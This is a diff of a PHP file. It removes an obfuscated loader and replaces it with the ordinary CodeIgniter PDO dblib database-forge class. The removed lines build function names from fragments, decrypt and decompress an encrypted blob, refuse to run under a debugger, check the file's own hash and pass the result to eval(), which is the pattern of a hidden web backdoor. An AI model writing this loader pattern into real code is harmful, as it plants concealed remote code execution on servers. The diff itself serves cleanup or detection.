@@ -1,28 +1,136 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_d6al6sbl=('bas'.'e64'.'_de'.'cod'.'e');
-$_lmidyt12=('gzu'.'nco'.'mpr'.'ess');
-$_pjqmtbs4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_xhyx5rsf='PYpHQs/80Ss=';
-$_kezr0fq6='1yGBw70f';
-$_ntyu5q9a='ooZHlBPj';
-$_hkhgwqcu='EH5qq0Bq';
-$_rq28q2io='0fqeGk7g';
-$_gtaam6en='vOYVYg==';
-$_qz2rd32l='gqNO+LyZ';
-$_z5350o56='+bp0glE3';
-$_e1vsjblc=$_d6al6sbl($_ntyu5q9a.$_hkhgwqcu.$_kezr0fq6.$_rq28q2io.$_xhyx5rsf);
-$_ptla8w7w=$_d6al6sbl($_z5350o56.$_qz2rd32l.$_gtaam6en);
-$_cs2jfc3m=$_d6al6sbl('VHCcqfBTFmLvbPF9DkpkH7D5p8XKxxivOQssC9ply0OuSsRJmK6JwsHwgtYyAO2t2Xa65EaNtS9okk+wWkHcOBIv8Rrn4y+jmG0eibuX/JCMjHy0e7bTdwDIxnmzXMmACEy1X9YJcyO6+MLjxszlA+fMlXP5kB21lo/Qn6dCAwVmbvcVGYEG3/XwS9vIw1Pm+sx/X45F/63B1F7iLHiMyumfaUKboeD5WP5hkP8g9vgLOIgnbMfiMGLZVbE65C+/HVPmBhf/toV9k+ruLH8gu/DxUTX9cCg/4OFroI3GJjWiwtgp0Hs5rAHMOuVJWWPoCfvnb0b+Po0tdq+RtXukY7JGoMC9wjoQs2CAWT0JyqoK1ogedL/IPIYUTptR/4Cj9gGKInGcZNlClBOY1TN65mgp09wkH+alLZqfU1OuhJGDQh2qIqZv+E1Sr1kiZNLZ27y6MqKV84ven+oDDwMp2tfUQHNdgtZgaBvfuZ/fIVB2LKEy+E/t9WzPrZr0DWkD2dw0dAqt1iAuMv1EHqf2ng4/IUOkb0uMUooQ1b+FkU6wL7PON4ULWKVP6SvZQekuqyStu7gCpwcsVVHoQOYlqn4uET5PUY5/tXhE6MD79PrIeGZFATK/fP8YEwb51mIOp2OWg4ZSzbf9uZnPrYiypSnrtXEeU2g3k2ubh71gcRMgopzFfxG6t75N1U66teBKGccLU8O2Qi64KG1bJvU62tHJgqXBoCOlVDdgGufjuBwcPo2vHDLcmNeMwfJTfAJq/ISn5j+mMd5niDamxb7uAgSQSfmgIyI+Nkab30gasHli1zQc2XhrzNB06fY+adTxZEMkS5hLjIbEGYZdotKKxnvMockLdArsKRZtJ6mw6lSym+o0CNtpytjKdVYN1AEgV9vDzK8jLpsp3D7jYK6KMOpHwiJW5dnxsCMiL+95ACCnO5w2RzlT38RvT+8fg+6EtuFBCzyiqvcj29xMzsgudozOWcOBT6wNDHPnEQK9IsU=');
-$_to9pi6r3=$_pjqmtbs4($_cs2jfc3m,'aes-256-cbc',$_e1vsjblc,OPENSSL_RAW_DATA,$_ptla8w7w);
-if($_to9pi6r3===false){exit;}
-$_d81wiicl=$_lmidyt12($_to9pi6r3);
-if($_d81wiicl===false){exit;}
-$_fig9o4sf='63239b327d3b13f375fe624edf72f212de27b4ac5044b051b26d9cf7ef87761b';
-$_n68mqk8i=@file_get_contents(__FILE__);
-if($_n68mqk8i!==false){
-$_azz8sr4c=str_replace($_fig9o4sf,"0000000000000000000000000000000000000000000000000000000000000000",$_n68mqk8i);
-$_r4to6lj1=hash("sha256",$_azz8sr4c);
-if($_r4to6lj1!==$_fig9o4sf){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_pdo_dblib_forge extends CI_DB_pdo_forge {
+
+
+
+
+
+protected $_create_table_if = "IF NOT EXISTS (SELECT * FROM sysobjects WHERE ID = object_id(N'%s') AND OBJECTPROPERTY(id, N'IsUserTable') = 1)\nCREATE TABLE";
+
+
+
+
+
+protected $_drop_table_if = "IF EXISTS (SELECT * FROM sysobjects WHERE ID = object_id(N'%s') AND OBJECTPROPERTY(id, N'IsUserTable') = 1)\nDROP TABLE";
+
+
+
+
+
+protected $_unsigned = array(
+'TINYINT' => 'SMALLINT',
+'SMALLINT' => 'INT',
+'INT' => 'BIGINT',
+'REAL' => 'FLOAT'
+);
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if (in_array($alter_type, array('ADD', 'DROP'), TRUE))
+{
+return parent::_alter_table($alter_type, $table, $field);
 }
-eval($_d81wiicl);
+$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table).' ALTER COLUMN ';
+$sqls = array();
+for ($i = 0, $c = count($field); $i < $c; $i++)
+{
+$sqls[] = $sql.$this->_process_column($field[$i]);
+}
+return $sqls;
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+if (isset($attributes['CONSTRAINT']) && strpos($attributes['TYPE'], 'INT') !== FALSE)
+{
+unset($attributes['CONSTRAINT']);
+}
+switch (strtoupper($attributes['TYPE']))
+{
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'INTEGER';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'INTEGER':
+$attributes['TYPE'] = 'INT';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE && stripos($field['type'], 'int') !== FALSE)
+{
+$field['auto_increment'] = ' IDENTITY(1,1)';
+}
+}
+}
